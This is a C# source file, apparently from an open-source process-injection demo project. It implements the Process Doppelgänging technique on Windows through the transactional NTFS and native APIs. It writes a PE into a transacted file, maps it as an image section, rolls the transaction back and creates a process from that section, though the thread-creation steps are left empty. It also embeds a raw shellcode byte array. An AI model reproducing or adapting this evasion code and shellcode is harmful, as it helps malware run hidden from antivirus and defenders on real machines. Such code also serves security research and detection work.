// Author: bopin (@bopin2020)
// Project: ProcessInjecting (https://github.com/bopin2020/ProcessInjecting)
// License: GNU GPLv3

using System;
using System.Text;
using System.IO;
using static Vanara.PInvoke.KtmW32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.NtDll;
using System.Runtime.InteropServices;
using Vanara.PInvoke;

namespace ProcessInjectionDemo
{
    partial class ProcessDoppelganging
    {
        public static SafeSectionHandle _ssh;
        public static void Run()
        {
            #region 环境变量

            //StringBuilder sb = new StringBuilder();
            //ExpandEnvironmentStrings(@"c:\windows\system32\calc.exe", sb,10);
            //Console.WriteLine(sb.ToString());

            #endregion

            using (SafeHTRXN htr = CreateTransaction(
                                                    null,           // Security_attribute
                                                    IntPtr.Zero,
                                                    0,
                                                    0,
                                                    0,
                                                    0,
                                                    texDesc))
            {
                // file,device,named pipe,mail slot
                // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfiletransactedw
                using (SafeHFILE hTransactedFile = CreateFileTransacted(
                                                                        @"c:\users\James\desktop\dummy.txt",  
                                                                        Vanara.PInvoke.Kernel32.FileAccess.FILE_GENERIC_READ | Vanara.PInvoke.Kernel32.FileAccess.FILE_GENERIC_WRITE,
                                                                        System.IO.FileShare.None,
                                                                        null,       // SECURITY_ATTRIBUTES
                                                                        System.IO.FileMode.Create,
                                                                        Vanara.PInvoke.FileFlagsAndAttributes.FILE_ATTRIBUTE_NORMAL,
                                                                        null,
                                                                        htr,
                                                                        IntPtr.Zero,  // ushort 0 会报错 使用第二个重载方法
                                                                        IntPtr.Zero))
                {
                    if (hTransactedFile.IsInvalid)
                    {
                        Console.WriteLine("CreateFileTransacted is invalid\t" + Marshal.GetLastWin32Error());
                        return;
                    }
                    
                    IntPtr add = Marshal.AllocHGlobal(shellcode.Length);
                    Marshal.Copy(shellcode, 0, add, shellcode.Length);
                    Address_shellcode = add;
                    uint writtenSize;
                    if (!WriteFile(hTransactedFile, Address_shellcode, (uint)shellcode.Length, out writtenSize, IntPtr.Zero))
                    {
                        return;
                    }

                    SafeSectionHandle ssh;
                    // 此处在Section存储的数据 是文件hTransactedFile 完整的PE文件
                    NTStatus status = NtCreateSection(out ssh,   // out SafeSectionHandle
                                                 ACCESS_MASK.GENERIC_ALL,
                                                 IntPtr.Zero,
                                                 IntPtr.Zero,
                                                 MEM_PROTECTION.PAGE_READONLY,
                                                 SEC_ALLOC.SEC_IMAGE,
                                                 hTransactedFile);
                    // STATUS_INVALID_IMAGE_NOT_MZ Transaction文件中的数据不是MZ开头
                    // STATUS_INVALID_IMAGE_PROTECT
                    if (status != NTStatus.STATUS_SUCCESS)
                    {
                        Console.WriteLine("NtCreateSection Error " + Marshal.GetLastWin32Error() +"\n" + status);
                        return;
                    }
                    // Rollback 回滚 就不会生成 CreateFileTransaction指定的文件
                    if (!RollbackTransaction(htr))
                    {
                        Console.WriteLine("RollbackTransaction Error " + Marshal.GetLastWin32Error());
                        return;
                    }
                    // 提交Transaction就会生成文件
                    //if (CommitTransactionAsync(htr))
                    //{
                    //    Console.WriteLine("file successfully");
                    //}
                    _ssh = ssh;
                }
            }

            // CreateProcess
            if (_ssh != null)
            {
                HPROCESS hProcess;
                HPROCESS hParent = GetCurrentProcess();
                // STATUS_IMAGE_NOT_AT_BASE:
                // 操作系统 进程线程创建经过 https://www.codenong.com/cs110938883/
                NTStatus status = NtCreateProcessEx(
                                                    out hProcess,
                                                    ACCESS_MASK.GENERIC_ALL,
                                                    IntPtr.Zero,
                                                    hParent,
                                                    PROCESS_CREATE_FLAGS.PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                                                    _ssh.DangerousGetHandle(),
                                                    IntPtr.Zero,
                                                    IntPtr.Zero,
                                                    0);
                // 如果注意看源码的话 会发现这里 为了支持重定位操作
                // STATUS_IMAGE_NOT_AT_BASE 必须返回，因此这里status与 STATUS_SUCCESS判断于逻辑不符
                // Annotation return;   使用 hProcess下面NtQueryInformationProcess成功
                if (status != NTStatus.STATUS_SUCCESS)
                {
                    Console.WriteLine("NtCreateProcessEx fail " + status);
                    // return;
                }
                PROCESS_BASIC_INFORMATION pi = new PROCESS_BASIC_INFORMATION();
                IntPtr piAddress = Marshal.AllocHGlobal(Marshal.SizeOf(pi));
                Marshal.StructureToPtr(pi,piAddress,true);
                // 第二个参数是查询数据的类型
                uint returnlength;
                status = NtQueryInformationProcess(
                                                    hProcess,
                                                    PROCESSINFOCLASS.ProcessBasicInformation,
                                                    piAddress,
                                                    (uint)Marshal.SizeOf(pi),
                                                    out returnlength);
                if (status != NTStatus.STATUS_SUCCESS)
                {
                    Console.WriteLine("NtQueryInformationProcess fail" + status);
                    return;
                }

                pi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(piAddress);
                uint BytesRead = 8;
                IntPtr lpBuffer = Marshal.AllocHGlobal(8);
                IntPtr rImgBaseOffset = pi.PebBaseAddress + 0x8;
                Console.WriteLine("\tImage Base Offset: 0x" + rImgBaseOffset);
                Console.WriteLine("\tProcess pid:" + pi.UniqueProcessId);

#if DEBUG
                StringBuilder sb2 = new StringBuilder();
                GetProcessImageFileName(hProcess,sb2,256);
                Console.WriteLine("ProcessImageFileName:" + sb2.ToString());
#endif
                #region 获取entry point
                
                #endregion

                #region setup process parameters

                #endregion

                #region CreateThread

                #endregion
            }
        }
        public static void QueryPolicyInformation(uint pid)
        {
            var p = OpenProcess(0x1000, true, pid);
            QueryPolicyInformation(p);
        }
        public static void QueryPolicyInformation(HPROCESS hProcess)
        {
            PROCESS_MITIGATION_POLICY _processPolicy = new PROCESS_MITIGATION_POLICY();
            PROCESS_MITIGATION_DEP_POLICY dep = new PROCESS_MITIGATION_DEP_POLICY();
            foreach (var item in _processPolicy.GetType().GetFields())
            {
                // Console.WriteLine(item.Name);

                if (item.Name != "value__" && item.GetValue(null).GetType().Name.Equals("PROCESS_MITIGATION_POLICY"))
                {
                    IntPtr addr = Marshal.AllocHGlobal(Marshal.SizeOf(dep));
                    // https://github.com/abulyaev/Process-Explorer/blob/716a9aa0b4f292ed54a9a6de2336b9e928c60ecf/Program.cs
                    if (GetProcessMitigationPolicy(hProcess, (PROCESS_MITIGATION_POLICY)item.GetValue(null), addr, Marshal.SizeOf(new PROCESS_MITIGATION_DEP_POLICY())))
                    {
                        Console.WriteLine(item.Name + "\ttrue\t" + (PROCESS_MITIGATION_POLICY)item.GetValue(null));
                    }
                    else
                    {
                        Console.WriteLine(item.Name + "\tfalse\t" + (PROCESS_MITIGATION_POLICY)item.GetValue(null));
                    }
                }
            }
        }
    }

    /// <summary>
    /// https://github.com/n1xbyte/Toolkit/blob/69c24f8cdd898f20ac3a79e81cc6bb61de8fa197/C%23%20Stuff/ProcessDopplegang.cs
    /// </summary>
    partial class ProcessDoppelganging
    {
        /*
        https://github.com/dahall/Vanara/blob/master/PInvoke/KtmW32/CorrelationReport.md
        1. CreateTransaction

        */
        public static byte[] shellcode2 = new byte[184] {
            0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
            0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
            0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
            0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
            0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
            0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
            0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
            0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
            0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
            0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
            0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
            0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
            0x00,0x53,0xff,0xd5 };

        public static byte[] shellcode = File.ReadAllBytes(@"C:\Users\James\Desktop\MessageBox.exe");

        private static IntPtr Address_shellcode = IntPtr.Zero;

        private const string texDesc = "James";
    }
}
